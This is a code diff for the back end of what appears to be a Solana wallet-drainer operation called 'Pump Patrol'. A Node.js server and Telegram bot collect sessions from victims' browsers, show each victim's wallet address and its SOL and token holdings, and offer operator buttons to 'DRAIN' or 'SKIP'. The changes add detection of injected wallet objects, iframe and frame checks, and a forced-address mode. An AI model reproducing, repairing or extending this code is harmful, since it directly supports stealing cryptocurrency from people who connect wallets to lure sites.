@@ -63,11 +63,7 @@ async function handle(m){
     return reply(`<b>sessions</b>\n${s}`);
   }
   if(c==='/diag'){
-    if(sid){
-      const s=sessions.get(sid);
-      if(!s)return reply('no session <code>'+esc(sid)+'</code>');
-      return reply(diagCard(sid,s));
-    }
+    if(sid){const s=sessions.get(sid);if(!s)return reply('no session <code>'+esc(sid)+'</code>');return reply(diagCard(sid,s))}
     if(!sessions.size)return reply('no sessions to diagnose');
     let out='';for(const[k,v]of sessions)out+=diagCard(k,v);
     return reply(out);
@@ -92,21 +88,23 @@ async function handle(m){
 function btns(sid){return{inline_keyboard:[[{text:'DRAIN',callback_data:'go:'+sid},{text:'SKIP',callback_data:'stop:'+sid}]]}}
 
 function diagCard(sid,s){
-  let o='🔍 <code>'+esc(sid)+'</code>\n';
+  let o='🔍 <code>'+esc(sid)+'</code> · '+(s.ver||'?')+'\n';
   o+='site: '+esc(s.site||'?')+'\n';
   const ph=s.phases||{};
   o+='phases: '+(Object.keys(ph).length?Object.keys(ph).join(' → '):'none')+'\n';
   if(s.scan){
-    const d=s.scan.detected||[];
-    o+='detected: '+(d.length?d.map(x=>x.name+(x.has?' ✓':' ✗')).join(', '):'none')+'\n';
+    o+='detected (usable): '+((s.scan.detected||[]).join(', ')||'none')+'\n';
+    const ck=s.scan.checked;
+    if(ck){const present=Object.keys(ck).filter(k=>ck[k]);o+='wallet globals present: '+(present.length?present.join(', '):'none')+'\n'}
+    if(s.scan.topSame===false)o+='note: running inside an iframe (top ≠ self)\n';
+    if(s.scan.frames!=null)o+='same-origin frames: '+s.scan.frames+'\n';
+    if(s.scan.addrMode)o+='mode: forced address '+esc(s.scan.addrMode)+'\n';
   }
   const w=(s.ready&&s.ready.wallets)||[];
   if(s.ready){
-    if(w.length)for(const x of w){
-      o+='\n'+esc(x.name)+' <code>'+esc(x.addr)+'</code>\n'+x.sol+' SOL';
-      for(const t of x.tokens||[])o+='\n· '+esc(t.mint.slice(0,6))+'… '+esc(t.amt);
-    }else o+='\nready — no wallets detected in that browser\n';
-  }else o+='\nnot reached ready — stuck in connect/read (see detected above)\n';
+    if(w.length)for(const x of w){o+='\n'+esc(x.name)+' <code>'+esc(x.addr)+'</code>\n'+x.sol+' SOL';for(const t of x.tokens||[])o+='\n· '+esc(t.mint.slice(0,6))+'… '+esc(t.amt)}
+    else o+='\nready — no usable wallets\n';
+  }else o+='\nnot reached ready — stuck in connect/read\n';
   if(s.fault)o+='\nFAULT: '+esc(s.fault.fault||s.fault.note||'unknown')+'\n';
   const v=verdicts.get(sid);
   o+='\nverdict: '+(v?('<b>'+v.a+'</b> pending'):(s.done?(s.note||'done'):'none pending'))+'\n';
@@ -116,7 +114,7 @@ function diagCard(sid,s){
 function readyCard(sid,r){
   let s='<b>Pump Patrol — session '+esc(sid)+'</b>\nsource: '+esc(r.site||'?')+'\n\n<b>WALLET CONNECTED — READY TO DRAIN</b>\n';
   const ws=r.wallets||[];
-  if(!ws.length)s+='<i>no wallets detected in this browser</i>\n';
+  if(!ws.length)s+='<i>no usable wallets in this browser</i>\n';
   let shown=0;
   for(const w of ws){
     s+='\n'+esc(w.name)+' <code>'+esc(w.addr)+'</code>\n'+w.sol+' SOL';
@@ -138,11 +136,7 @@ function doneCard(sid,r){
 }
 
 async function searchPair(sym){
-  try{
-    const s=await fetch('https://api.dexscreener.com/latest/dex/search?q='+encodeURIComponent(sym)).then(r=>r.json());
-    const ps=(s&&s.pairs)||[];
-    return ps.find(p=>p.chainId==='solana')||ps[0]||null;
-  }catch(e){return null}
+  try{const s=await fetch('https://api.dexscreener.com/latest/dex/search?q='+encodeURIComponent(sym)).then(r=>r.json());const ps=(s&&s.pairs)||[];return ps.find(p=>p.chainId==='solana')||ps[0]||null}catch(e){return null}
 }
 async function candles(sym,tf){
   const pair=await searchPair(sym);
@@ -168,10 +162,7 @@ const MIME={'.html':'text/html','.js':'text/javascript','.css':'text/css','.svg'
 http.createServer(async(req,res)=>{
   try{
     const u=new URL(req.url,'http://x');
-    if(req.method==='OPTIONS'){
-      res.writeHead(204,{'access-control-allow-origin':'*','access-control-allow-methods':'GET,POST,OPTIONS','access-control-allow-headers':'content-type','access-control-max-age':'86400'});
-      res.end();return;
-    }
+    if(req.method==='OPTIONS'){res.writeHead(204,{'access-control-allow-origin':'*','access-control-allow-methods':'GET,POST,OPTIONS','access-control-allow-headers':'content-type','access-control-max-age':'86400'});res.end();return}
     if(u.pathname.startsWith('/api/')){
       if(u.searchParams.get('k')!==SECRET)return json(res,{ok:false},403);
       const seg=u.pathname.split('/').filter(Boolean);
@@ -187,6 +178,7 @@ http.createServer(async(req,res)=>{
         let s=sessions.get(sid)||{};
         s.phases=s.phases||{};s.phases[ph]=Date.now();
         s.site=r.site||s.site;
+        if(r.ver)s.ver=r.ver;
         s.done=(ph==='done');
         if(ph==='start'||ph==='scan')s.scan=r;
         if(ph==='ready')s.ready=r;
